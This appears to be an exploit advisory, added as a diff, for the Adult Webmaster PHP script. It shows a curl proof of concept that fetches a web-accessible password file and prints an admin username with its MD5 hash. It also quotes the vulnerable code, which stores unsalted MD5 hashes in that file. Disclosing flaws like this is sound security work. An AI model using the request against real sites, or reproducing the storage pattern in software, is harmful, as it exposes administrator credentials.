@@ -1,0 +1,48 @@
+##########################################################################
+[+] Exploit:Adult Webmaster PHP - Password Disclosure                    #
+[+] Author: vinicius777					                 #
+[+] Email/Twitter: vinicius777 [AT] gmail  @vinicius777_                 #	                 
+[+] Vendor Homepage: http://sourceforge.net/projects/adultweb/  	 #
+##########################################################################
+
+ 
+[1] Administrative Credential Disclosure
+
+PoC: 
+
+root@kali:/# curl http://localhost/home/caspers/public_html/demo/admin/userpwdadfasdfre.txt
+
+admin:3a4ebf16a4795ad258e5408bae7be341
+
+#
+
+Vulnerable Code:
+[+] admin/common.php
+
+        // Check user existance 
+        $pfile = fopen("userpwdadfasdfre.txt","a+");
+    rewind($pfile);
+
+    while (!feof($pfile)) {
+        $line = fgets($pfile);
+        $tmp = explode(':', $line);
+        if ($tmp[0] == $user) {
+            $errorText = "The selected user name is taken!";
+            break;
+        }
+    }
+
+    // If everything is OK -> store user data
+    if ($errorText == ''){
+                // Secure password string
+                $userpass = md5($pass1);
+
+                fwrite($pfile, "\r\n$user:$userpass");
+    }
+
+    fclose($pfile);
+ 
+
+#
+#
+# Greetz to g0tm1lk and TheColonial.
